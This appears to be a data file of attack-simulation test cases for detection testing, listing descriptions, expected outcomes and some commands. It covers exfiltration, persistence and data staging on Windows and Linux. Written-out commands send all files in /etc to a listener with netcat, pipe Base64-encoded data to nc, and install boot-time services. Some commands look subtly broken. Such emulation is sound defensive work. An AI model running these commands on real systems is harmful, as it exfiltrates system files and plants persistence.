attacks.description: Encodes a benign text file using certutil.exe, simulating data encoding for exfiltration.
attacks.expected_behavior: Creates an encoded file in the TEMP directory.

attacks.description: Creates a text file with benign data using PowerShell to simulate data preparation for exfiltration.
attacks.expected_behavior: Generates a text file with 'Test Data' in the TEMP directory.

attacks.description: Uses net.exe to create a local share for data transfer, simulating an alternative protocol.
attacks.expected_behavior: Creates a temporary network share pointing to the TEMP directory.

attacks.description: Basic exfiltration using netcat to send test data to a specified IP and port.
attacks.expected_behavior: The command sends 'test_data' to the server listening on 192.168.1.100:1234.

attacks.description: Intermediate exfiltration using netcat to send the contents of /etc/passwd to a specified IP and port.
attacks.expected_behavior: The command sends the contents of /etc/passwd to the server listening on 192.168.1.100:1234.

attacks.command: sudo bash -c 'for file in $(find /etc -type f); do echo "File: $file"; cat "$file" | nc -w 3 192.168.1.100 1234; done'
attacks.description: Advanced exfiltration using netcat and find to send the contents of all files in /etc to a specified IP and port.
attacks.expected_behavior: The command iterates over all files in /etc, sending each file's contents to the server listening on 192.168.1.100:1234.

attacks.description: This command uses PowerShell to start Notepad as a system process, demonstrating process creation.
attacks.expected_behavior: Notepad will start without creating a new window, demonstrating the creation of a system process.

attacks.command: sc.exe create TestService binPath= "C:\Windows\System32\cmd.exe /c echo Test Service is running" start= auto
attacks.description: This command creates a new Windows service that runs a command, demonstrating process creation via service.
attacks.expected_behavior: A new service named 'TestService' will be created, which runs a command when started.

attacks.command: powershell -Command "$bytes = [System.Text.Encoding]::Unicode.GetBytes('echo Test Command'); $base64 = [Convert]::ToBase64String($bytes); Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo Test Command' -Verb RunAs"
attacks.description: This command uses PowerShell to encode and execute a command with elevated privileges, demonstrating advanced process creation.
attacks.expected_behavior: A command prompt will open with elevated privileges, executing the 'echo Test Command' command.

attacks.description: Creates a simple script in /tmp that prints 'Hello World' and executes it.
attacks.expected_behavior: A script named 'hello.sh' is created in /tmp and executed, printing 'Hello World'.

attacks.command: sudo bash -c 'echo "#!/bin/bash\necho Hello World" > /etc/init.d/hello_service && chmod +x /etc/init.d/hello_service && update-rc.d hello_service defaults'
attacks.description: Creates and installs a system service that prints 'Hello World' when started.
attacks.expected_behavior: A system service named 'hello_service' is created in /etc/init.d and set to start on boot, printing 'Hello World' when executed.

attacks.command: sudo bash -c 'echo "#!/bin/bash\nwhile true; do echo Hello World; sleep 60; done" > /etc/init.d/hello_service && chmod +x /etc/init.d/hello_service && update-rc.d hello_service defaults'
attacks.description: Creates a persistent system service that continuously prints 'Hello World' every 60 seconds.
attacks.expected_behavior: A system service named 'hello_service' is created in /etc/init.d, set to start on boot, and continuously prints 'Hello World' every 60 seconds.

attacks.description: Basic exfiltration using certutil.exe to encode a file and netcat to send it to a local server.
attacks.expected_behavior: The data.txt file is encoded and sent to a local server on port 4444.

attacks.command: powershell -Command "Get-Content C:\\path\\to\\data.txt | ConvertTo-Base64 | Out-File -FilePath C:\\path\\to\\encoded.txt"; echo $(Get-Content C:\\path\\to\\encoded.txt) | nc.exe 127.0.0.1 4444
attacks.description: Intermediate exfiltration using PowerShell to encode data in Base64 and netcat to send it to a local server.
attacks.expected_behavior: The content of data.txt is encoded in Base64 and sent to a local server on port 4444.

attacks.command: powershell -Command "$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content C:\\path\\to\\data.txt -Raw))); echo $encoded | certutil.exe -decode - "C:\\path\\to\\decoded.txt"; echo decoded.txt | nc.exe 127.0.0.1 4444"
attacks.description: Advanced exfiltration using PowerShell for Base64 encoding and certutil.exe for decoding, followed by netcat for sending data.
attacks.expected_behavior: The content of data.txt is encoded, decoded, and sent to a local server on port 4444.

attacks.description: Intermediate exfiltration using curl to POST data to a local server.

attacks.description: Advanced exfiltration using netcat with base64 encoding to obfuscate data.
attacks.expected_behavior: This command encodes 'test_data' in base64 before sending it via netcat to a local server on port 4444. It demonstrates a more covert method of data exfiltration.

attacks.command: powershell -Command "New-Item -ItemType Directory -Path '$env:TEMP\DataCollection' -Force; Get-Process | Select-Object -First 10 | Export-Csv -Path '$env:TEMP\DataCollection\processes.csv' -NoTypeInformation; Compress-Archive -Path '$env:TEMP\DataCollection\*' -DestinationPath '$env:TEMP\DataCollection.zip' -Force"
attacks.description: Creates a directory, exports a list of processes to a CSV, and archives the data using PowerShell.
attacks.expected_behavior: A directory is created, a CSV file with process information is generated, and both are archived into a zip file.

attacks.description: Uses CMD to create a directory and collect task list data, then PowerShell to archive the data.
attacks.expected_behavior: A directory is created, a CSV file with task list data is generated, and both are archived into a zip file.

attacks.command: certutil.exe -encode %TEMP%\data.txt %TEMP%\data.txt.b64 & powershell -Command "New-Item -ItemType Directory -Path '$env:TEMP\DataCollection' -Force; Set-Content -Path '$env:TEMP\DataCollection\data.txt' -Value (Get-Content -Path '$env:TEMP\data.txt.b64' | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) }) -Force; Compress-Archive -Path '$env:TEMP\DataCollection\*' -DestinationPath '$env:TEMP\DataCollection.zip' -Force"
attacks.description: Encodes a text file using certutil, decodes it with PowerShell, and archives it.
attacks.expected_behavior: A text file is encoded, decoded, and archived into a zip file.
